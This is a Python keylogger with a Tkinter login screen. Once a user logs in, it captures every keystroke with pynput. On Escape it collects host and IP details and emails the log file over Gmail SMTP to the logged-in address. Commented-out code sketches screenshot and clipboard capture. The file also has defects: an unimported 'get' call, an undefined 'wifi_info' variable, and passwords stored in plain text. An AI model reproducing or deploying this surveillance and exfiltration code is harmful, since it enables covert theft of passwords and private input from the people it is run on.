from pynput import keyboard
from PIL import Image, ImageTk, ImageGrab
import tkinter as tk
from tkinter import *
import time
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
#import docx      '''for images to append in a document file'''
#from docx.shared import Inches
import subprocess
import os
import re
#import win32clipboard  '''for clipboard'''
'''********************************************************FILES*******************************************************************************'''
name_id="name_id.txt"
pswd_id="pswd_id.txt"
file="LOG.txt"                                #FILE FOR KEYS AND SYSTEM INFORMATION
screenshot_info="screenshot.png"              #FILE NAME FOR SCREENSHOT
ss_doc="ss_doc.docx"                          #FILE NAME FOR SCREENSHOTS
clipboard_info="clipboard.txt"                #FILE NAME FOR CLIPBOARD INFORMATION
'''****************************************************************EMAIL*************************************************************************'''
email_address=" "        #FROM ADDRESS
password=" "                       #PASSWORD OF FROM ADDRESS
global toaddr
#data=[]
def send_mail(filename,attachment,toaddr):
    fromaddr=email_address
    msg=MIMEMultipart()
    msg['From']=fromaddr
    msg['To']=toaddr
    msg['Subject']="Log File"
    body="KeyLogger_Information"
    msg.attach(MIMEText(body,'plain'))
    filename=filename
    attachment=open(attachment,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition',"attachment;filename=%s"%filename)
    msg.attach(p)
    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text=msg.as_string()
    s.sendmail(fromaddr,toaddr,text)
    with open(file,"w") as f:
            f.truncate(0)
    s.quit()
'''******************************************************************SYSTEM INFORMATION************************************************************'''
def system_information():
    with open(file, "a") as f:
        f.write("\n---------------------\n")
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor : " + (platform.processor()) + '\n')
        f.write("System : " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine : " + platform.machine() + "\n")
        f.write("Hostname : " + hostname + "\n")
        f.write("Private IP Address : " + IPAddr + "\n")
        f.write("FQDN : " +socket.getfqdn()+"\n")
'''************************************************************SCREENSHOT******************************************************************************'''
'''demo for screenshot'''
'''def screenshot():
    doc=docx.Document()
    doc.add_heading('Screenshots',0)
    for i in range(5):
        #time.sleep(5)
        im = ImageGrab.grab()
        im.save(screenshot_info)
        doc.add_picture(screenshot_info,width=Inches(5), height=Inches(5))
    doc.save(ss_doc)
screenshot()'''
'''**********************************************************CLIPBOARD******************************************************************************'''
'''demo for clipboard'''
'''def copy_clipboard():
    if(not (os.path.isfile(clipboard_info))):
        f=open(clipboard_info,"w")
        f.close()
    with open(clipboard_info,"a") as f:
        f.truncate(0)
        f.write("CLIPBOARD DATA\n")
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(pasted_data)
        except:
            f.write("Clipboard could be not be copied")
copy_clipboard()'''
'''***************************************************************KEY LISTENER************************************************************************'''
count = 0
keys =[]
d={'<96>':'0','<97>':'1','<98>':'2','<99>':'3','<100>':'4','<101>':'5','<102>':'6','<103>':'7','<104>':'8','<105>':'9'}
def press(key):
    global keys, count
    logging.info(str(key))
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        writetofile(keys)
        keys =[]
def writetofile(key):
    if(not(os.path.isfile(file))):
        f=open(file,"w")
        f.close()
    with open(file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k=="Key.space":
                f.write(' ')
            elif k=="Key.enter":
                f.write('\n')
            elif k=="Key.backspace":
                f.write('(X)')
            elif(k in d.keys()):
                f.write(d[k])
            elif k.find("Key")==-1:
                f.write(k)
def release(key):
    if key == keyboard.Key.esc:
        system_information()
        send_mail(file,file, toaddr)
        #send_mail(system_info,system_info, toaddr)
        send_mail(wifi_info,wifi_info,toaddr)
        send_mail(ss_doc,ss_doc,toaddr)
        return False

def start(user):
    global toaddr
    toaddr=user
    with keyboard.Listener(on_press=press,on_release=release) as l:
        l.join()
'''***************************************************************LOGIN AND REGISTER INTERFACE******************************************************************************************'''    
def main():
    global name_dict,pswd_dict
    name_list=list()
    pswd_list=list()
    root = tk.Tk()
    width= root.winfo_screenwidth() 
    height= root.winfo_screenheight()
    root.geometry("%dx%d" % (width, height))
    root.title("WELCOME")
    apps=[]
    def files():
        l=[]
        ele=""
        with open(name_id,"r") as f:
            for i in f.read():
                if(i=='\n'):
                    for i in l:
                        ele+=i
                    name_list.append(ele)
                    ele=""
                    l=[]
                else:
                    l.append(i)
        with open(pswd_id,"r") as g:
            for i in g.read():
                if(i=='\n'):
                    for i in l:
                        ele+=i
                    pswd_list.append(ele)
                    ele=""
                    l=[]
                else:
                    l.append(i)
        
    def check_reg_labels():
            ele=""
            l=[]
            nm=Name.get()
            user=UserName.get()
            pswd=PassWord.get()
            rpswd=RePassWord.get()
            if user=="" and pswd=="" and nm=="":
                    tk.Label(frame2,text="Name/Username/Password can't be empty",fg="red").pack()
            elif nm=="":
                    tk.Label(frame2,text="Name can't be empty",fg="red").pack()
            elif user=="":
                    tk.Label(frame2,text="Username can't be empty",fg="red").pack()
            elif pswd=="":
                    tk.Label(frame2,text="Password can't be empty",fg="red").pack()
            elif rpswd=="":
                    tk.Label(frame2,text="Re enter the password",fg="red").pack()
            else:
                    if(not (os.path.isfile(name_id) and not(os.path.isfile(pswd_id)))):
                                f=open(name_id,"w")
                                f.close()
                                f=open(pswd_id,"w")
                                f.close()
                    if(pswd==rpswd):
                        files()
                        if user not in name_list:
                            name_list.append(user)
                            pswd_list.append(pswd)
                            with open(name_id,"a") as f:
                                f.write(user)
                                f.write('\n')
                                f.close()
                            with open(pswd_id,"a") as f:
                                f.write(pswd)
                                f.write('\n')
                                f.close()
                            
                            display= tk.Label(frame, text="You have successfully registered, Please Login!!", fg="Violet")
                            display.pack()
                            frame2.destroy()
                            frame.tkraise()
                        else:
                            display= tk.Label(frame2, text="User already existed", fg="Violet")
                            display.pack()           
                    else:
                        display= tk.Label(frame2, text="Please check your password", fg="Violet")
                        display.pack()
    def sign_in():
            for widget in frame2.winfo_children():
                    widget.destroy()
            frame.tkraise()                  
    def register():
            frame2.tkraise()
            '''frame2=tk.Frame(root,bg="White")
            frame2.place(relwidth=0.8,relheight=0.8,relx=0.1,rely=0.1)'''
            nlr = tk.Label(frame2, text="Name", bg="white",font=('Helvetica',10), fg="green")
            lr1 = tk.Label(frame2, text="EmailID", bg="white",font=('Helvetica',10), fg="green")
            lr2 = tk.Label(frame2, text="PassWord", bg="white",font=('Helvetica',10),fg="green")
            lr3 = tk.Label(frame2, text="Re-enter Password", bg="white",font=('Helvetica',10),fg="green")
            global Name,UserName, PassWord, RePassWord
            Name=tk.StringVar()
            UserName=tk.StringVar()
            PassWord=tk.StringVar()
            RePassWord=tk.StringVar()
            nlr.pack()
            entry1=tk.Entry(frame2,textvariable=Name).pack()
            lr1.pack()
            entry1=tk.Entry(frame2,textvariable=UserName).pack()
            lr2.pack()
            entry2=tk.Entry(frame2,textvariable=PassWord,show="*").pack()
            lr3.pack()
            entry3=tk.Entry(frame2,textvariable=RePassWord,show="*").pack()
            Register=tk.Button(frame2,text="Register",padx=10, pady=5, fg="white",bg="gray",command=check_reg_labels)
            Register.pack()
            l3 = tk.Label(frame2, text="Already Have account, SignIn!!!", bg="white",font=('Helvetica',10), fg="green")
            l3.pack()
            Signin=tk.Button(frame2,text="Sign In",padx=10, pady=5, fg="white",bg="gray",command=sign_in)
            Signin.pack()      
    def check_labels():
            flag=0
            user=Username.get()
            pswd=Password.get()
            if user=="" and pswd=="":
                    disp=tk.Label(frame,text="Username/Password can't be empty",fg="red")
                    disp.pack()
            elif pswd=="":
                    disp=tk.Label(frame,text="Password can't be empty",fg="red")
                    disp.pack()
            elif user=="":
                    disp=tk.Label(frame,text="Username can't be empty",fg="red")
                    disp.pack()
            else:
                    if((os.path.exists(name_id)) and (os.path.exists(pswd_id))):  
                        files()
                    if user not in name_list:
                        disp=tk.Label(frame,text="User Not found",fg="red")
                        disp.pack()
                    else:
                        for i in range(len(name_list)):
                            if(user==name_list[i] and pswd==pswd_list[i]):
                                flag=1
                                break
                        if(flag==1):
                            runscript(user)
                        else:
                            disp=tk.Label(frame,text="Incorrect credentials",fg="red")
                            disp.pack()           
    def runscript(user):
            display= tk.Label(frame, text="You have successfully logged in, Enjoy!!!", fg="Violet")
            display.pack()
            #before_start(user)
            root.destroy()
            start(user)        
    frame2=tk.Frame(root,bg="white")
    frame2.place(relwidth=0.8,relheight=0.8,relx=0.1,rely=0.1)
    frame=tk.Frame(root,bg="White")
    frame.place(relwidth=0.8,relheight=0.8,relx=0.1,rely=0.1)
    '''IMAGE'''
    from PIL import Image, ImageTk
    image=Image.open("iStock-1175502114.png")
    resize_image=image.resize((100,100))
    img=ImageTk.PhotoImage(resize_image)
    photo=tk.Label(frame,image=img,bg="white")
    photo.pack()
    '''LOGIN'''
    l1 = tk.Label(frame, text="EmailID", bg="white",font=('Helvetica',20), fg="green")
    l2 = tk.Label(frame, text="Password", bg="white",font=('Helvetica',20),fg="green")
    global Username, Password
    Username=tk.StringVar()
    Password=tk.StringVar()
    entry1=tk.Entry(frame,textvariable=Username,bg="white",bd=3)
    entry2=tk.Entry(frame,textvariable=Password,show="*",bg="white",bd=3)
    l1.pack()
    entry1.pack()
    l2.pack()
    entry2.pack()
    Login=tk.Button(frame,text="Login",padx=10, pady=5, fg="white",bg="gray", command=check_labels)
    Login.pack()
    '''REGISTER'''
    l3 = tk.Label(frame, text="New User, Sign up...", bg="white",font=('Helvetica',10), fg="green")
    l3.pack()
    Signup=tk.Button(frame,text="Sign up",padx=10, pady=5, fg="white",bg="gray", command=register)
    Signup.pack()
    frame.tkraise()
    root.mainloop()
if __name__ == "__main__":
    main()
